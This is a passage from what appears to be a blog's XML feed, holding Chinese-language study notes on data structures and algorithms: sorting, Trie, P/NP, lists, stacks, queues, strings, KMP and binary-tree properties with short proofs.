检测到攻击后可以采取行动有效阻止攻击，因此可以说 IPS 是一种建立 在 IDS 基础上的新生网络安全产品。</p><h1 id="Part-3-去年试题"><a href="#Part-3-去年试题" class="headerlink" title="Part 3 去年试题"></a><center><font color="#DC143C">Part 3 去年试题</font></center></h1>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构+算法复习</title>
      <link href="/2021/03/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/03/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>南航教材：《数据结构（C语言版）》严蔚敏、吴伟民 编著</p><p>南大教材：《数据结构》（用面向对象方法与C++语言描述），第2版 ，殷人昆主编</p></blockquote><h1 id="1-分治算法、动态规划、回溯法、分支定界法、贪心算法"><a href="#1-分治算法、动态规划、回溯法、分支定界法、贪心算法" class="headerlink" title="1 分治算法、动态规划、回溯法、分支定界法、贪心算法"></a>1 分治算法、动态规划、回溯法、分支定界法、贪心算法</h1><ol><li><strong>分治算法</strong>：将一个大问题，分割成一些规模较小的子问题，这些子问题相互独立且与原问题性质相同，求出子问题的解，就可得到原问题的解。</li><li><strong>动态规划</strong>：将一个大问题，分割成一些规模较小的子问题，求出子问题的解，就可得到原问题的解。与分治法最大的差别是：适合于用动态规划法求解的问题，经分解后得到的子问题往往不是互相独立的。为减少重复计算，对每一个子问题只解一次，将其不同阶段的不同状态保存在数组中。</li><li><strong>回溯法</strong>：在包含问题的所有解的解空间树中，按照深度优先搜索的策略，从根结点出发深度探索解空间树。当探索到某一结点时，要先判断该结点是否包含问题的解，如果包含，就从该结点出发继续探索下去，如果不包含，则逐层向其祖先结点回溯。</li><li><strong>分支限界法</strong>：回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。分支限界法常以广度优先或以最小耗费优先的方式搜索问题的解空间树。在分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成为扩展结点，就一次性产生其所有儿子结点。在这些儿子结点中，那些导致不可行解或导致非最优解的儿子结点被舍弃，其余儿子结点被加入活结点表中。此后，从活结点表中取下一结点成为当前扩展结点，并重复上述结点扩展过程。这个过程一直持续到找到所求的解或活结点表为空时为止。</li><li><strong>贪心算法</strong>：在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，所做出的仅是在某种意义上的局部最优解。贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。贪心策略适用的前提是：局部最优策略能导致产生全局最优解。</li></ol><h1 id="2-快速排序的思想、优化方法"><a href="#2-快速排序的思想、优化方法" class="headerlink" title="2 快速排序的思想、优化方法"></a>2 快速排序的思想、优化方法</h1><ol><li>快速排序的基本思想：快速排序使用分治的思想，通过一趟排序将待排序列分割成两部分，其中一部分记录的关键字均比另一部分记录的关键字小。之后分别对这两部分记录继续进行排序，以达到整个序列有序的目的。</li><li>快速排序的三个步骤：<ol><li>选择枢纽元：在待排序列中，按照某种方式挑出一个元素，作为 “枢纽元”（pivot）</li><li>分割操作：以该枢纽元在序列中的实际位置，把序列分成两个子序列。此时，在枢纽元左边的元素都比该枢纽元小，在枢纽元右边的元素都比枢纽元大</li><li>递归地对两个序列进行快速排序，直到序列为空或者只有一个元素。</li></ol></li><li>优化方法<ol><li>当待排序序列的长度分割到比较小的长度后，使用插入排序。</li><li>在每一次分割结束后，可以把与划分元相等的元素聚在一起，继续下次分割时，不用再对与划分元相等元素分割。</li><li>最佳划分是将序列划分成等长的两个子序列，因此提出三数取中的思想。取序列中，下标第一位，下标中间一位，下标最后一位的三个数进行排序，取排序结果中排中间的数据作为划分元。</li><li>快排函数在函数尾部有两次递归操作，我们可以对其使用尾递归优化。当递归调用是整个函数体中最后执行的语句且它的返回值不属于表达式的一部分时，这个递归调用就是尾递归。这样所使用的栈空间就大大缩减了，这使得实际的运行效率会变得更高。</li></ol></li></ol><h1 id="3-各种排序算法的最好、平均、最坏时间复杂度"><a href="#3-各种排序算法的最好、平均、最坏时间复杂度" class="headerlink" title="3 各种排序算法的最好、平均、最坏时间复杂度"></a>3 各种排序算法的最好、平均、最坏时间复杂度</h1><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/20181127173207774.jpg" class="lozad"></p><h1 id="4-Trie-树"><a href="#4-Trie-树" class="headerlink" title="4 Trie 树"></a>4 Trie 树</h1><ul><li>Trie 树，又称单词查找树、字典树，是一种树形结构，是一种哈希树的变种，是一种用于快速检索的多叉树结构。</li><li><p><strong>典型应用</strong>：用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。</p></li><li><p><strong>优点</strong>：最大限度地减少无谓的字符串比较，查询效率比哈希表高。</p></li><li><p><strong>核心思想</strong>：空间换时间，利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。</p></li><li><p>对于搜索引擎，一般会保留一个单词查找树的前N个字（全球或最近热门使用的）；</p></li><li><p>对于每个用户，保持Trie树最近前N个字为该用户使用的结果。</p></li><li><p>如果用户点击任何搜索结果，Trie树可以非常迅速并异步获取完整的部分／模糊查找，然后预取数据，再用一个Web应用程序可以发送一个较小的一组结果的浏览器。</p></li></ul><h1 id="5-P-NP问题"><a href="#5-P-NP问题" class="headerlink" title="5 P/NP问题"></a>5 P/NP问题</h1><ol><li>P问题：即为所有可以由一个确定型图灵机在多项式表达的时间内解决的问题；（矩阵乘法、多项式求值）</li><li>NP问题（Nondeterminism Polynomial）：由所有可以在多项式时间内验证它的解是否正确的决定问题组成。（典型的子集求和问题，大数分解问题）</li><li>NP-hard问题：任意np问题都可以在多项式时间内归约为该问题。归约的意思是为了解决问题A，先将问题A归约为另一个问题B，解决问题B同时也间接解决了问题A。</li><li>NP完全问题(NP-C问题)：既是NP问题，也是NP-hard问题。例如，SAT问题（第一个NPC问题）。该问题的基本意思是，给定一系列布尔变量以及它的约束集，是否存在一个解使得它的输出为真。</li><li>相互关系：显然，所有P问题都是NP问题，反之则不一定。npc问题是np问题的子集，也是p问题和np问题的差异所在。如果找到一个多项式内能被解决的npc问题的解决方法，那么P=NP。</li></ol><h1 id="Ch1-绪论"><a href="#Ch1-绪论" class="headerlink" title="Ch1 绪论"></a>Ch1 绪论</h1><ul><li><p><strong>数据：</strong>数据是信息的载体，是描述客观事物的数、字符、以及所有能输入到计算机中，被计算机程序识别和处理的符号（数值、字符等）的集合。</p></li><li><p><strong>数据元素（数据成员）</strong>：是数据的基本单位。在不同的条件下，数据元素又可称为元素、结点、顶点、记录等。</p></li><li><strong>数据对象：</strong>具有相同性质的数据元素（数据成员）的集合。</li><li><strong>数据结构的形式定义</strong>：数据结构由某一数据对象及该对象中所有数据成员之间的关系组成。记为：Data_Structure = {D, R}，其中，D是某一数据对象，R是该对象中所有数据成员之间的关系的有限集合。</li><li>数据结构包括“逻辑结构” 和“物理结构”两个方面(层次)</li><li>任何一个算法的设计取决于选定的逻辑结构；而算法的最终实现依赖于采用的存储结构。</li><li>关系的映象方法：<ul><li>顺序映象（顺序存储方法）：以相对的存储位置表示后继关系</li><li>链式映象（链接存储方法）：以附加信息(指针)表示后继关系</li><li>索引存储方法：通过建立存储结点信息，以及建立附加的索引表来标识结点的地址的存储方法。</li><li>散列存储方法：由节点的关键码值决定节点的存储地址。</li></ul></li><li>数据结构的分类：<ul><li>线性结构：表、栈、队列</li><li>非线性结构：<ul><li>层次结构： 树，二叉树，堆</li><li>网状结构： 图</li><li>其它：集合</li></ul></li></ul></li><li>抽象数据类型 (ADTs: Abstract  Data Types)：<ul><li>由用户定义，用以表示应用问题的数据模型</li><li>由基本的数据类型组成, 并包括一组相关的服务（或称操作）</li><li>支持了逻辑设计和物理实现的分离，支持封装和信息隐蔽</li></ul></li><li>一个算法必须满足以下五个重要特性：<ul><li>有输入  有0个或多个输入</li><li>有输出  有一个或多个输出(处理结果)</li><li>确定性  每步定义都是确切、无歧义的</li><li>有穷性  算法应在执行有穷步后结束</li><li>有效性  每一条运算应足够基本</li></ul></li><li>算法的效率包括时间代价和空间代价，两者都与问题的规模有关。</li><li>(大Ο记号)：$T(n) = O(f(n))$，算法中关键操作重复执行的次数是规模$n$的某个函数$T(n)$</li><li>大Ο表示法：当且仅当存在正整数$c$和$n_0$ ，使得$T(n)&lt;= c*f(n)$对所有的$n&gt;= n_0$成立，则称该算法的时间增长率在$O(f(n))$中，记为$T(n) = O(f(n))$。</li><li>使用大Ο记号表示的算法的时间复杂度，称为算法的渐近时间复杂度（Asymptotic Complexity）</li><li>$O(1) &lt;O(log_2n) &lt; O(n) &lt; O(nlog_2n) &lt; O(n^2) &lt; O(n^3) &lt;O(2^n ) &lt; O(3^n) &lt; O(n!)$</li><li>渐近空间复杂度：$S (n) = O(f (n))$</li></ul><h1 id="Ch2-线性表"><a href="#Ch2-线性表" class="headerlink" title="Ch2 线性表"></a>Ch2 线性表</h1><ul><li>线性表的存储方式<ul><li>顺序存储方式 —— 顺序表<ul><li>特点：存储利用率高，存取速度快</li><li>缺点：插入、删除等操作时需要移动大量数据</li></ul></li><li>链表存储方式 —— 链表(单链表、循环链表、双向链表)<ul><li>特点：适应表的动态增长和删除</li><li>缺点：需要额外的指针存储空间</li></ul></li></ul></li><li><p><strong>单链表操作</strong></p><ul><li>插入<ul><li>在链表的最前端插入</li><li>在链表中间插入</li><li>在链表末尾插入</li></ul></li><li>删除<ul><li>删除表中第一个元素</li><li>删除表中或表尾元素</li></ul></li><li>带附加头结点（表头结点）的单链表：<ul><li>表头结点位于表的最前端，本身不带数据，仅标志表头。</li><li>设置表头结点的目的是统一空表与非空表的操作，简化链表操作的实现。</li></ul></li></ul></li><li><strong>循环链表操作</strong>：插入、删除</li><li><strong>双向链表操作</strong>：插入、删除</li><li><strong>双向循环链表操作</strong>：插入、删除</li><li><strong>（算法）多项式及其运算</strong><ul><li>多项式顺序存储表示的缺点<ul><li>插入和删除时项数可能有较大变化，因此要移动大量数据</li><li>不利于多个多项式的同时处理</li></ul></li><li>多项式链表存储表示的优点<ul><li>多项式的项数可以动态地增长，不存在存储溢出问题。</li><li>插入、删除方便，不移动元素</li></ul></li></ul></li><li>静态链表<ul><li>为数组中每一个元素附加一个链接指针，就形成静态链表结构。</li><li>静态链表每个结点由两个数据成员构成：data域存储数据，link域存放链接指针。</li></ul></li></ul><div class="table-container"><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><h1 id="Ch3-栈与队列"><a href="#Ch3-栈与队列" class="headerlink" title="Ch3 栈与队列"></a>Ch3 栈与队列</h1><ul><li><p><strong>栈</strong>：后进先出（LIFO）</p><ul><li><p>如何合理进行栈空间分配，以避免栈溢出或空间的浪费？</p><ul><li>双栈共享一个栈空间（多栈共享栈空间）</li><li>栈的链接存储方式—— 链式栈</li></ul></li><li><p>栈的应用—表达式的计算（中缀、前缀、后缀）</p></li><li><p><strong>（算法）应用后缀表示计算表达式的值</strong>：</p><ol><li>从左向右顺序地扫描表达式，并用一个栈暂存扫描到的操作数或计算结果。</li><li>扫描中遇操作数则压栈；遇操作符则从栈中退出两个操作数，计算后将结果压入栈</li><li>最后计算结果在栈顶</li></ol></li><li><p><strong>（算法）中缀表达式转换为后缀表达式</strong>：</p><ol><li><p>| 操作符ch  |  ;   |  (   | * / % | + -  |  )   |<br>| :———-: | :—: | :—: | :—-: | :—: | :—: |<br>| isp(栈内) |  0   |  1   |   5   |  3   |  6   |<br>| icp(栈外) |  0   |  6   |   4   |  2   |  1   |</p><p>操作符优先级相等的情况只出现在括号配对或栈底的 “;” 号与输入流最后的 “;” 号配对时</p></li><li><p>操作符栈初始化，将结束符 ‘;’ 进栈。然后读入中缀表达式字符流的首字符ch。</p></li><li><p>重复执行以下步骤，直到ch = ‘;’，同时栈顶的操作符也是 ‘;’，停止循环。</p><ol><li>若 ch 是操作数直接输出，读入下一个字符 ch</li><li>若ch是操作符，判断ch的优先级icp和位于栈顶的操作符op的优先级isp：<ol><li>若 icp(ch) &gt; isp(op)，令ch进栈，读入下一个字符ch。</li><li>若 icp(ch) &lt; isp(op)，退栈并输出。</li><li>若 icp(ch) == isp(op)，退栈但不输出，若退出的是“(”号读入下一个字符ch。</li></ol></li></ol></li><li><p>算法结束，输出序列即为所需的后缀表达式</p></li></ol></li><li><p><strong>（做题）中缀表达式转换为后缀表达式</strong>：</p><ol><li>先对中缀表达式按运算优先次序加上括号；</li><li>再把操作符后移到右括号的后面并以就近移动为原则；</li><li>最后将所有括号消去。</li></ol></li></ul></li><li><p><strong>队列</strong>：先进先出（FIFO）</p><ul><li><p>进队：新元素在rear处加入，rear = rear + 1。</p></li><li><p>出队：取出下标为 front 的元素，front = front + 1</p></li><li><p>队空时：rear == front</p></li><li><p>队满时：rear == maxSize （假溢出）</p></li><li><p>解决假溢出的办法之一：将队列元素存放数组首尾相接，形成循环（环形）队列。</p></li><li><p>循环队列：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">队头指针进<span class="number">1</span>:  front = (front+<span class="number">1</span>) % maxSize;</span><br><span class="line">队尾指针进<span class="number">1</span>:  rear = (rear+<span class="number">1</span>) % maxSize;</span><br><span class="line">队列初始化：front = rear = <span class="number">0</span>;</span><br><span class="line">队空条件：front == rear;</span><br><span class="line">队满条件：(rear+<span class="number">1</span>) % maxSize == front</span><br></pre></td></tr></table></figure></li><li><p>链式队列：</p><ul><li>队头在链头，队尾在链尾。</li><li>链式队列在进队时无队满问题，但有队空问题。</li><li>队空条件为 front == NULL</li></ul></li></ul></li><li><p><strong>优先级队列</strong>：</p><ul><li>每次从队列中取出的是具有最高优先权(优先级)的元素</li><li>优先权是根据问题而定的</li><li>出现相同的优先权的元素时，按FIFO的方式处理</li></ul></li></ul><div class="table-container"><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><h1 id="Ch4-数组、串与广义表"><a href="#Ch4-数组、串与广义表" class="headerlink" title="Ch4 数组、串与广义表"></a>Ch4 数组、串与广义表</h1><ul><li><p>二维数组中数组元素的顺序存放：</p><ul><li><strong>行优先存放</strong>：设数组开始存放位置 $LOC(0, 0) = a$，每个元素占用 $l $个存储单元，$LOC ( j, k ) = a + ( j <em> m + k ) </em> l$</li><li><strong>列优先存放</strong>：设数组开始存放位置 $LOC(0, 0) = a$， 每个元素占用 $l$ 个存储单元，$LOC ( j, k ) = a + ( k <em> n + j ) </em> l$</li></ul></li><li><p>特殊矩阵：非零元素或零元素的分布有一定规律的矩阵</p><ul><li>对称矩阵：为节约存储， 只存对角线及对角线以上的元素，或者只存对角线或对角线以下的元素。前者称为上三角矩阵，后者称为下三角矩阵。按行存放</li><li>三对角矩阵：除主对角线及在主对角线上 下最临近的两条对角线上的元素外， 所有其它元素均为0。总共有3n-2个非零元素。按行存放</li></ul></li><li><p>稀疏矩阵 (Sparse Matrix)</p><ul><li><p>每一个三元组 $(i, j, a_{ij})$ 唯一确定了矩阵A的一个非零元素。 </p></li><li><p><strong>（算法）稀疏矩阵转置</strong>：</p><ol><li>设矩阵列数为 Cols， 对矩阵三元组表扫描 Cols 次；</li><li>第 k 次扫描找寻所有列号为 k 的项， 将其行号变列号、列号变行号，顺次存于转置矩阵三元组表。</li><li>设矩阵三元组表总共有 t 项， 上述算法的时间代价为 $O ( n<em>t )$。 当非零元素的个数 t 和 $m</em>n$ 同数量级时， 算法Transpose的时间复杂度为$O(m*n^2)$。</li></ol></li><li><p><strong>（算法）稀疏矩阵快速转置</strong>：</p><ol><li><p>为加速转置速度， 建立辅助数组 rowSize 和 rowStart：</p><ol><li>rowSize记录矩阵转置前各列，即转置矩阵各行非零元素个数；</li><li>rowStart记录转置矩阵各行非零元素在转置三元组表中开始存放位置。</li></ol></li><li><p>扫描矩阵三元组表，根据某项列号，确定它转置后的行号, 查 rowStart 表, 按查到的位置直接将该项存入转置三元组表中。</p></li></ol></li><li><p>带行指针数组的二元组表</p></li><li><p>正交链表：适应矩阵操作(+、 -、 *)时矩阵非零元素的动态变化</p></li></ul></li><li><p>字符串 (String)</p><ul><li>空串和空白串不同，分别表示长度为1的空白串和长度为0的空串。  </li><li>串中任意个连续字符组成的子序列称为该串的子串，包含子串的串相应地称为主串。</li><li>特别地，空串是任意串的子串，任意串是其自身的子串。</li><li>朴素的模式匹配算法：算法的运行时间为$O(n*m)$，低效的原因在于每趟重新比较时，目标串的检测指针要回退。但在一般情况下，实际的执行时间近似于$O(n+m)$，因此至今仍被采用。</li><li><strong>（算法）KMP算法</strong>：算法的运行时间为$O(n+m)$，<a href="http://47.110.133.39:8082/blog/29" target="_blank" rel="noopener">跳转</a></li><li>KMP最大的特点是指示主串的指针不需回溯，整个匹配过程中，对主串仅需要从头至尾扫描一遍，这对处理从外设输入的庞大文件很有效，可以边读入边匹配，而无需回头重读。</li></ul></li><li><p>广义表 (General Lists )</p><ul><li>表元素，可以是表（ 称为子表）， 可以是数据元素（ 称为原子）</li><li>n 为表的长度。 n = 0 的广义表为空表</li><li>n &gt; 0 时， 表的第一个表元素称为广义表的表头（ head），除此之外，其它表元素组成的表称为广义表的表尾（ tail）</li><li>n = 0 时，表头表尾不存在</li><li>广义表的表示</li><li>广义表结点定义：<ul><li>结点类型 utype： = 0, 表头； = 1, 原子数据；= 2, 子表</li><li>信息 info： utype = 0 时, 存放引用计数(ref)；utype = 1时, 存放数据值(value)； utype = 2时, 存放指向子表表头的指针(hlink)</li><li>尾指针tlink： utype = 0时, 指向该表第一个结点； utype != 0 时, 指向同一层下一个结点</li></ul></li><li>广义表的递归算法 </li><li>广义表的复制算法  </li><li>求广义表深度的算法</li><li>广义表的删除算法</li></ul></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center"><a href="http://47.110.133.39:8082/blog/29" target="_blank" rel="noopener">KMP算法跳转</a></th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:center"></td><td></td></tr></tbody></table></div><h1 id="Ch5-树与二叉树"><a href="#Ch5-树与二叉树" class="headerlink" title="Ch5 树与二叉树"></a>Ch5 树与二叉树</h1><ul><li><p>树和森林的概念</p><ul><li>有根树<ul><li>一棵有根树T，简称为树，它是n (n ≥ 0) 个结点的有限集合。当n = 0时，T 称为空树；否则，T 是非空树。记作$T=\left{\begin{array}{ll}<br>\Phi, &amp; n=0 \<br>\left{r, T<em>{1}, T</em>{2}, \ldots, T_{m}\right}, &amp; n&gt;0<br>\end{array}\right.$</li><li>r 是一个特定的称为根 (root) 的结点，它只有直接后继，没有直接前驱</li><li>根以外的其他结点划分为 m (m&gt;=0) 个互不相交的有限集合$T_1, T_2, …, T_m$，每个集合又是一棵树，并且称为根的子树</li><li>每棵子树的根结点有且仅有一个直接前驱，但可以有0个或多个直接后继</li></ul></li><li>树的基本术语<ul><li>子女：若结点的子树非空，结点子树的根即为该结点的子女。</li><li>双亲（父亲）：若结点有子女，该结点是子女的双亲（父亲）。</li><li>兄弟：同一结点的子女互称为兄弟。</li><li>度：结点的子女个数即为该结点的度；树中各个结点的度的最大值称为树的度。</li><li>分支结点：度不为0的结点即为分支结点，亦称为非终端结点。</li><li>叶结点：度为0的结点即为叶结点，亦称为终端结点。</li><li>祖先：根结点到该结点的路径上的各个结点都是该结点的祖先。</li><li>子孙：某结点的所有下属结点，都是该结点的子孙。</li><li>结点的层次：规定根结点在第一层，其子女结点的层次等于它的层次加一。以下类推。</li><li>结点的深度：结点的深度即为结点的层次；离根最远结点的层次即为树的深度。</li><li>结点的高度：规定叶结点的高度为1，其双亲结点的高度等于它的高度加一。</li><li>树的高度：等于根结点的高度，即根结点所有子女高度的最大值加一。</li><li>有序树：树中结点的各棵子树 T1, T2, …是有次序的，即为有序树。</li><li>无序树：树中结点的各棵子树之间的次序是不重要的，可以互相交换位置。</li><li>森林：森林是m（m≥0）棵树的集合。 </li></ul></li><li>树的抽象数据类型</li></ul></li><li><p>二叉树</p><ul><li><p>二叉树的定义：一棵二叉树是结点的一个有限集合，该集合或者为空，或者是由一个根结点加上两棵分别称为左子树和右子树的、互不相交的二叉树组成。</p></li><li><p>二叉树的性质：</p><ul><li><p>性质1   若二叉树结点的层次从 1 开始, 则在二叉树的第 i 层最多有 $2^{i-1}$ 个结点。( i≥1)</p><blockquote><p>用数学归纳法证明</p><p>证明：　    </p><p>​        归纳基础：i=1时，有$2^{i-1}=2^0=1$。因为第1层上只有一个根结点，所以命题成立。<br>​    　归纳假设：假设对所有的j(1≤j&lt;i)命题成立，即第j层上至多有$2^{j-1}$个结点，证明j=i时命题亦成立。<br>​    　归纳步骤：根据归纳假设，第i-1层上至多有$2^{i-2}$个结点。由于二叉树的每个结点至多有两个孩子，故第i层上的结点数至多是第i-1层上的最大结点数的2倍。即j=i时，该层上至多有$2×2^{i-2}=2^{i-1}$个结点，故命题成立。</p></blockquote></li><li><p>性质2   深度为 k 的二叉树最少有 k 个结点，最多有 $2^k-1$个结点。( k≥1 )</p><blockquote><p>因为每一层最少要有1个结点，因此，最少结点数为 k。最多结点个数借助性质1：用求等比级数前k项和的公式：$2^0 +2^1 +2^2 + …+2^{k-1} = 2^k-1$ </p></blockquote></li><li><p>性质3    对任何一棵二叉树，如果其叶结点有 $n_0$ 个，度为 2 的非叶结点有 $n_2$ 个,   则有 $n_0＝n_2＋1$</p><blockquote><p>若设度为 1 的结点有 $n_1$ 个，总结点数为n，总边数为e，则根据二叉树的定义，<br>$n = n_0+n_1+n_2，e = 2n_2+n_1 = n-1$</p><p>因此，有<br>$n_2 = n_0-1 $， $n_0 = n_2+1$ </p></blockquote></li><li><p>性质4    具有 n (n≥0) 个结点的完全二叉树的深度为$\left\lceil\log _{2}(n+1)\right\rceil$</p><blockquote><p>设完全二叉树的深度为k，则有 $2^{k-1}-1&lt;n \leqslant 2^{k}-1$（上面k-1层结点数；包括第k层的最大结点数）</p><p>变形 $2^{k-1}&lt;n+1 \leqslant 2^{k}$</p><p>取对数 $k-1&lt;\log _{2}(n+1) \leqslant k$</p><p>得到 $\left\lceil\log _{2}(n+1)\right\rceil=k$</p></blockquote></li><li><p>性质5  如将一棵有n个结点的完全二叉树自顶向下，同一层自左向右连续给结点编号1, 2, …, n，则有以下关系： </p><ul><li>若i = 1, 则 i 无双亲</li><li>若i &gt; 1, 则 i 的双亲为$\lfloor i / 2\rfloor$</li><li>若$2<em>i &lt;= n$, 则 i 的左子女为 $2</em> i$</li><li>若$2<em>i+1 &lt;= n$, 则 i 的右子女为$2</em>i+1$</li><li>若 i 为奇数, 且i != 1，则其左兄弟为i-1</li><li>若 i 为偶数, 且i != n，则其右兄弟为i+1</li></ul></li></ul></li><li><p>满二叉树 (Full Binary Tree)：深度为 k 的满二叉树是有 $2^{k}-1$个结点的二叉树。</p></li><li><p>完全二叉树 (Complete Binary Tree)：若设二叉树的深度为 k，则共有 k 层。除第 k 层外，其它各层 (1～k-1) 的结点数都达到最大个数，第k层从右向左连续缺若干结点，这就是完全二叉树。</p></li><li><p>二叉树的抽象数据类型</p></li><li><p>二叉树的顺序表示</p></li><li><p>二叉树的链表表示（二叉链表）</p><ul><li>二叉树结点定义：每个结点有3个成员，data域存储结点数据，leftChild 和 rightChild 分别存放指向左子女和右子女的指针。</li></ul></li><li><p>二叉树的链表表示（三叉链表）</p><ul><li>每个结点增加一个指向双亲的指针parent，使得查找双亲也很方便</li><li>三叉链表的静态结构</li></ul></li></ul></li><li><p>二叉树遍历</p><ul><li><p>二叉树的遍历就是按某种次序访问树中的结点，要求每个结点访问一次且仅访问一次。</p></li><li><p><strong>（算法）中序遍历 (Inorder Traversal)</strong></p><ul><li>若二叉树为空，则直接返回；</li><li>否则：<ul><li>中序遍历左子树 (L)；</li><li>访问根结点 (V)；</li><li>中序遍历右子树 (R)</li></ul></li></ul></li><li><p><strong>（算法）前序遍历 (Preorder Traversal)</strong></p><ul><li>若二叉树为空，则直接返回；</li><li>否则：<ul><li>访问根结点 (V)；</li><li>前序遍历左子树 (L)；</li><li>前序遍历右子树 (R)。</li></ul></li></ul></li><li><p><strong>（算法）后序遍历 (Postorder Traversal)</strong></p><ul><li>若二叉树为空，则直接返回；</li><li>否则<ul><li>后序遍历左子树 (L)；</li><li>后序遍历右子树 (R)；</li><li>访问根结点 (V)。</li></ul></li></ul></li><li><p><strong>（算法）利用二叉树前序遍历建立二叉树</strong></p></li><li><p><strong>（算法）层次遍历二叉树的算法</strong></p><ul><li>层次遍历二叉树就是从根结点开始，按层次逐层遍历</li><li>这种遍历需要使用一个先进先出队列，在处理上一层时，将其下一层的结点直接进到队列（的队尾）。在上一层结点遍历完后，下一层结点正好处于队列的队头，可以继续访问它们。</li><li>算法是非递归的。</li></ul></li><li><p>由给定的前序序列和中序序列能够唯一地确定一棵二叉树（或者后序遍历和中序遍历）</p><blockquote><p>证明：通过先序序列找到根结点和末尾元素，因为先序和后续最后遍历的都是右子树，所以末尾相同元素即为根节点的右子树，不断对比，每找到一棵子树的根结点就用斜线将其左右与其他元素断开分成一颗颗子树。</p></blockquote></li><li><p>由给定的前序序列和后序序列不能唯一地确定一棵二叉树</p></li></ul></li><li><p>线索化二叉树</p><ul><li>又称为穿线树。</li><li>通过二叉树的遍历，可将二叉树中所有结点的数据排列在一个线性序列中，可以找到某数据在这种排列下它的前驱和后继。</li><li>希望不必每次都通过遍历找出这样的线性序列。只要事先做预处理，将某种遍历顺序下的前驱、后继关系记在树的存储结构中，以后就可以高效地找出某结点的前驱、后继。</li><li>方法一：增加 Pred 指针和 Succ 指针的二叉树<ul><li>这种设计的缺点是每个结点增加两个指针，当结点数很大时存储消耗较大。</li><li>对于原来的二叉链表结构，一棵n个结点的二叉树共有2n个指针域，而非空的指针域为n-1个，因此，仍有n+1个指针域没有利用起来。</li></ul></li><li>方法二：增加左右线索标志的二叉树<ul><li>改造树结点，将 pred 指针和 succ 指针压缩到 leftChild 和 rightChild 的空闲指针中，并增设两个标志 ltag 和 rtag，指明指针是指示子女还是前驱／后继。后者称为线索。</li><li>ltag (或rtag) = 0，表示相应指针指示左子女（或右子女结点）；当ltag (或rtag) = 1, 表示相应指针为前驱（或后继）线索。</li></ul></li><li>线索化二叉树及其链表表示</li><li>前序线索化二叉树</li><li>后序线索化二叉树</li></ul></li><li><p>树与森林</p><ul><li>树(一般的树)的存储表示<ul><li>广义表表示</li><li>双亲表示<ul><li>树中结点的存放顺序一般不做特殊要求，但为了操作实现的方便，有时也会规定结点的存放顺序。例如，可以规定按树的前序次序存放树中的各个结点，或规定按树的层次次序安排所有结点。 </li></ul></li><li>子女链表表示</li><li>子女指针表示<ul><li>一个合理的想法是在结点中存放指向每一个子女结点的指针。但由于各个结点的子女数不同，每个结点设置数目不等的指针，将很难管理。</li><li>为此，设置等长的结点，每个结点包含的指针个数相等，等于树的度（degree）。</li><li>这保证结点有足够的指针指向它的所有子女结点。但可能产生很多空闲指针，造成存储浪费。</li></ul></li><li>子女-兄弟表示<ul><li>firstChild 指向该结点的第一个子女结点。无序树时，可任意指定一个结点为第一个子女。</li><li>nextSibling 指向该结点的下一个兄弟。任一结点在存储时总是有顺序的。</li><li>若想找某结点的所有子女，可先找firstChild,再反复用 nextSibling 沿链扫描。</li></ul></li></ul></li><li>树的遍历<ul><li>深度优先遍历<ul><li>先根次序遍历<ul><li>当树非空时：访问根结点；依次先根遍历根的各棵子树</li><li>树的先根遍历结果与其对应二叉树表示的前序遍历结果相同</li><li>树的先根遍历可以借助对应二叉树的前序遍历算法实现</li></ul></li><li>后根次序遍历<ul><li>当树非空时，依次后根遍历根的各棵子树；访问根结点</li><li>树的后根遍历结果与其对应二叉树表示的中序遍历结果相同</li><li>树的后根遍历可以借助对应二叉树的中序遍历算法实现</li></ul></li></ul></li><li>广度优先（层次次序）遍历<ul><li>若树非空，则根结点入队</li><li>若队列非空，队头元素出队并访问，同时将该元素的孩子依次入队</li></ul></li></ul></li><li>树与二叉树的转换：孩子兄弟表示法</li><li>森林与二叉树的转换<ul><li>将一般树化为二叉树表示就是用树的子女-兄弟表示来存储树的结构。</li><li>森林与二叉树表示的转换可以借助树的二叉树表示来实现。</li></ul></li><li>森林转化成二叉树的规则<ul><li>若 F 为空，即 n = 0，则对应的二叉树 B 为空树。</li><li>若 F 不空，则<ul><li>二叉树 B 的根是 F 第一棵树 T1 的根；</li><li>其左子树为$B (T<em>{11}, T</em>{12}, …, T<em>{1m})$，其中，$T</em>{11}, T<em>{12}, …, T</em>{1m }$是 $T_1$ 的根的子树；</li><li>其右子树为$ B (T_2, T_3, …, T_n)$，其中，$T_2, T_3, …, T_n$ 是除 $T_1$ 外其它树构成的森林。</li></ul></li></ul></li><li>二叉树转换为森林的规则<ul><li>如果 B 为空，则对应的森林 F 也为空。</li><li>如果 B 非空，则<ul><li>F 中第一棵树$ T_1$ 的根为 B 的根；</li><li>$T<em>1$ 的根的子树森林 ${ T</em>{11}, T<em>{12}, …, T</em>{1m} }$ 是由 B 的根的左子树 LB 转换而来；</li><li>F 中除了 $T_1$ 之外其余的树组成的森林$ { T_2, T_3, …, T_n } $是由 B 的根的右子树 RB 